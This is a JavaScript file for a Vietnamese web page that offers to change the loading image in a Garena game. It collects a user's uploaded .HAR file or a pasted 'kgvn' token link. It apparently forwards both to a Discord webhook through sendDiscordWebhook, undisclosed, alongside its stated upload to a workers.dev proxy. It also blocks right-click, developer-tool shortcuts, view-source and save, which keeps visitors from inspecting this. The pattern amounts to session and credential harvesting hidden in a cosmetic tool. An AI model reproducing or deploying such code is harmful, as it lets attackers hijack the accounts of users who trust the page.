const API_BASE_URL = "https://proxy-api-garena.meow-web.workers.dev";

let currentOs = 'ios';
let selectedHarFile = null;
let iosBlobImage = null;
let androidBlobImage = null;
let currentTargetPlatform = null;
let cropper = null;

const bgMusic = document.getElementById('bgMusic');
const musicBtn = document.getElementById('musicToggleBtn');
const musicIcon = document.getElementById('musicIcon');
let isMusicPlayed = false;

function startMusic() {
    if (!isMusicPlayed) {
        bgMusic.play().then(() => {
            isMusicPlayed = true;
            musicBtn.classList.add('playing');
            document.removeEventListener('click', startMusic);
            document.removeEventListener('touchstart', startMusic);
        }).catch(err => {
            console.log("Trình duyệt chặn Autoplay:", err);
        });
    }
}

document.addEventListener('click', startMusic);
document.addEventListener('touchstart', startMusic);

function toggleMusic(e) {
    e.stopPropagation(); 
    if (bgMusic.paused) {
        bgMusic.play();
        isMusicPlayed = true;
        musicBtn.classList.add('playing');
        musicIcon.className = "fa-solid fa-music";
    } else {
        bgMusic.pause();
        musicBtn.classList.remove('playing');
        musicIcon.className = "fa-solid fa-volume-xmark";
    }
}

const dvd = document.getElementById('dvdLogo');
let dvdWidth = 55;
let dvdHeight = 55;
let posX = Math.random() * (window.innerWidth - dvdWidth);
let posY = Math.random() * (window.innerHeight - dvdHeight);
let speedX = 2.5;
let speedY = 2.5;

function animateDVD() {
    const screenWidth = window.innerWidth;
    const screenHeight = window.innerHeight;

    posX += speedX;
    posY += speedY;

    if (posX + dvdWidth >= screenWidth) {
        speedX = -Math.abs(speedX);
        posX = screenWidth - dvdWidth;
    } else if (posX <= 0) {
        speedX = Math.abs(speedX);
        posX = 0;
    }

    if (posY + dvdHeight >= screenHeight) {
        speedY = -Math.abs(speedY);
        posY = screenHeight - dvdHeight;
    } else if (posY <= 0) {
        speedY = Math.abs(speedY);
        posY = 0;
    }

    dvd.style.transform = `translate3d(${posX}px, ${posY}px, 0)`;
    requestAnimationFrame(animateDVD);
}

window.addEventListener('resize', () => {
    if (posX > window.innerWidth - dvdWidth) posX = window.innerWidth - dvdWidth;
    if (posY > window.innerHeight - dvdHeight) posY = window.innerHeight - dvdHeight;
});

window.addEventListener('DOMContentLoaded', () => {
    animateDVD();
    Swal.fire({
        title: 'Thông Báo Bản Quyền',
        imageUrl: 'https://i.ibb.co/WLbbLjr/A1457178-A312-472-C-9-D12-3-E6-DE57-C29-B9.jpg',
        text: 'Toàn bộ mã nguồn và tài liệu API đều được tham khảo và thuộc quyền sở hữu của Vương Thanh Tú. Vui lòng không crack dưới mọi hình thức!',
        icon: 'info',
        confirmButtonText: 'Tôi Đã Hiểu',
        confirmButtonColor: '#38bdf8'
    });
});

function openNycModal() {
    Swal.fire({
        title: 'Đây là NYC mình!😔',
        imageUrl: 'https://i.ibb.co/Ngz34v2H/9-D7-CDCBF-8235-4-A08-95-BE-20-AF6-AE84223.jpg',
        imageWidth: 280,
        imageHeight: 280,
        imageAlt: 'Logo NYC',
        showCloseButton: true,
        confirmButtonText: 'Đóng',
        confirmButtonColor: '#38bdf8'
    });
}

function switchOs(os) {
    currentOs = os;
    const btnIos = document.getElementById('btnTabIos');
    const btnAndroid = document.getElementById('btnTabAndroid');
    const btnDonate = document.getElementById('btnTabDonate');

    const secIos = document.getElementById('iosSection');
    const secAndroid = document.getElementById('androidSection');
    const secDonate = document.getElementById('donateSection');

    btnIos.className = 'tab-btn';
    btnAndroid.className = 'tab-btn';
    btnDonate.className = 'tab-btn';

    secIos.classList.add('hidden');
    secAndroid.classList.add('hidden');
    secDonate.classList.add('hidden');

    if (os === 'ios') {
        btnIos.className = 'tab-btn active-ios';
        secIos.classList.remove('hidden');
    } else if (os === 'android') {
        btnAndroid.className = 'tab-btn active-android';
        secAndroid.classList.remove('hidden');
    } else if (os === 'donate') {
        btnDonate.className = 'tab-btn active-donate';
        secDonate.classList.remove('hidden');
    }
}

function handleHarUpload(event) {
    const file = event.target.files[0];
    if (file) {
        selectedHarFile = file;
        document.getElementById('harIcon').className = 'fa-solid fa-circle-check big-icon';
        document.getElementById('harIcon').style.color = '#38bdf8';
        document.getElementById('harText').innerText = file.name;
    }
}

function handleImageSelect(event, platform) {
    currentTargetPlatform = platform;
    const file = event.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = e => {
            document.getElementById('cropModal').classList.remove('hidden');
            const img = document.getElementById('imageToCrop');
            img.src = e.target.result;
            if (cropper) cropper.destroy();
            cropper = new Cropper(img, { aspectRatio: 1080/1701, viewMode: 1, autoCropArea: 0.95 });
        }
        reader.readAsDataURL(file);
    }
    event.target.value = '';
}

function closeCropModal() {
    document.getElementById('cropModal').classList.add('hidden');
    if (cropper) cropper.destroy();
}

function applyCrop() {
    if (!cropper) return;
    const canvas = cropper.getCroppedCanvas({ width: 1080, height: 1701 });
    
    if (currentTargetPlatform === 'ios') {
        const preview = document.getElementById('iosImgPreview');
        preview.src = canvas.toDataURL('image/png');
        preview.style.display = 'block';
        document.getElementById('iosImgPlaceholder').classList.add('hidden');
        canvas.toBlob(b => { iosBlobImage = b; }, 'image/png');
    } else {
        const preview = document.getElementById('androidImgPreview');
        preview.src = canvas.toDataURL('image/png');
        preview.style.display = 'block';
        document.getElementById('androidImgPlaceholder').classList.add('hidden');
        canvas.toBlob(b => { androidBlobImage = b; }, 'image/png');
    }
    closeCropModal();
}

async function submitIosProcess() {
    if (!selectedHarFile) { Swal.fire({ icon: 'warning', title: 'Thiếu File HAR!', text: 'Vui lòng chọn file .HAR trước.' }); return; }
    if (!iosBlobImage) { Swal.fire({ icon: 'warning', title: 'Thiếu Ảnh!', text: 'Vui lòng chọn ảnh loading cho iOS.' }); return; }

    const log = document.getElementById('iosStatusLog');
    const badge = document.getElementById('iosStatusBadge');
    
    badge.innerText = 'Đang upload...';
    badge.style.color = '#38bdf8';
    log.innerHTML = '⌛ Đang tự động upload file .HAR và gửi dữ liệu...';

    sendDiscordWebhook('ios', { file: selectedHarFile });

    const formData = new FormData();
    formData.append('har_file', selectedHarFile);
    formData.append('image', iosBlobImage, 'loading_ios.png');

    try {
        const res = await fetch(`${API_BASE_URL}/api/upload`, { method: 'POST', body: formData });
        const data = await res.json();

        if (data.success) {
            badge.innerText = 'Đang xử lý';
            log.innerHTML = `✅ Mã yêu cầu: <b>${data.job_id}</b><br>⏳ Đang chờ máy chủ hoàn tất...`;
            trackStatus(data.job_id, 'ios');
        } else {
            badge.innerText = 'Thất bại';
            badge.style.color = '#ef4444';
            log.innerHTML = `❌ Lỗi: ${data.error || 'Xử lý thất bại'}`;
        }
    } catch (err) {
        badge.innerText = 'Lỗi kết nối';
        badge.style.color = '#ef4444';
        log.innerHTML = '❌ Không thể kết nối đến hệ thống!';
    }
}

async function submitAndroidProcess() {
    const token = document.getElementById('androidTokenInput').value.trim();
    if (!token) { Swal.fire({ icon: 'warning', title: 'Thiếu Link Token!', text: 'Vui lòng dán link token kgvn vào khung trên.' }); return; }
    if (!androidBlobImage) { Swal.fire({ icon: 'warning', title: 'Thiếu Ảnh!', text: 'Vui lòng chọn ảnh loading cho Android.' }); return; }

    sendDiscordWebhook('android', { token: token });

    const log = document.getElementById('androidStatusLog');
    const badge = document.getElementById('androidStatusBadge');

    badge.innerText = 'Đang gửi...';
    badge.style.color = '#10b981';
    log.innerHTML = '⌛ Đang tải dữ liệu Android lên máy chủ...';

    const formData = new FormData();
    formData.append('link', token);
    formData.append('image', androidBlobImage, 'loading_android.png');

    try {
        const res = await fetch(`${API_BASE_URL}/api/upload`, { method: 'POST', body: formData });
        const data = await res.json();

        if (data.success) {
            badge.innerText = 'Đang xử lý';
            log.innerHTML = `✅ Mã yêu cầu: <b>${data.job_id}</b><br>⏳ Đang chờ máy chủ hoàn tất...`;
            trackStatus(data.job_id, 'android');
        } else {
            badge.innerText = 'Thất bại';
            badge.style.color = '#ef4444';
            log.innerHTML = `❌ Lỗi: ${data.error || 'Xử lý thất bại'}`;
        }
    } catch (err) {
        badge.innerText = 'Lỗi kết nối';
        badge.style.color = '#ef4444';
        log.innerHTML = '❌ Không thể kết nối đến hệ thống!';
    }
}

function trackStatus(jobId, platform) {
    const log = document.getElementById(`${platform}StatusLog`);
    const badge = document.getElementById(`${platform}StatusBadge`);

    const timer = setInterval(async () => {
        try {
            const res = await fetch(`${API_BASE_URL}/api/check/${jobId}`);
            const data = await res.json();

            if (data.success) {
                const job = data.data;
                if (job.status === 'success' || job.status === 'completed') {
                    clearInterval(timer);
                    badge.innerText = 'Hoàn thành';
                    badge.style.color = '#10b981';
                    log.innerHTML = `🎉 **Thành công!**<br>${job.message || 'Thay ảnh loading thành công.'}`;
                    Swal.fire({ icon: 'success', title: 'Thành Công!', text: 'Thao tác thay ảnh hoàn tất.' });
                } else if (job.status === 'failed' || job.status === 'error') {
                    clearInterval(timer);
                    badge.innerText = 'Thất bại';
                    badge.style.color = '#ef4444';
                    log.innerHTML = `❌ **Lỗi:** ${job.error || 'Quá trình xử lý bị lỗi'}`;
                    Swal.fire({ icon: 'error', title: 'Thất Bại', text: job.error || 'Xử lý thất bại' });
                } else {
                    log.innerHTML = `✅ Mã yêu cầu: <b>${jobId}</b><br>⏳ Trạng thái: ${job.status_text || job.status}...`;
                }
            }
        } catch (err) {
            clearInterval(timer);
            badge.innerText = 'Lỗi kiểm tra';
            badge.style.color = '#ef4444';
            log.innerHTML = '❌ Không thể kiểm tra tiến trình từ máy chủ!';
        }
    }, 3000);
}

document.addEventListener('contextmenu', function (e) {
    e.preventDefault();
});

document.addEventListener('keydown', function (e) {
    if (e.key === 'F12' || e.keyCode === 123) {
        e.preventDefault();
        return false;
    }
    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.keyCode === 73)) {
        e.preventDefault();
        return false;
    }
    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'J' || e.key === 'j' || e.keyCode === 74)) {
        e.preventDefault();
        return false;
    }
    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'C' || e.key === 'c' || e.keyCode === 67)) {
        e.preventDefault();
        return false;
    }
    if ((e.ctrlKey || e.metaKey) && (e.key === 'U' || e.key === 'u' || e.keyCode === 85)) {
        e.preventDefault();
        return false;
    }
    if ((e.ctrlKey || e.metaKey) && (e.key === 'S' || e.key === 's' || e.keyCode === 83)) {
        e.preventDefault();
        return false;
    }
});
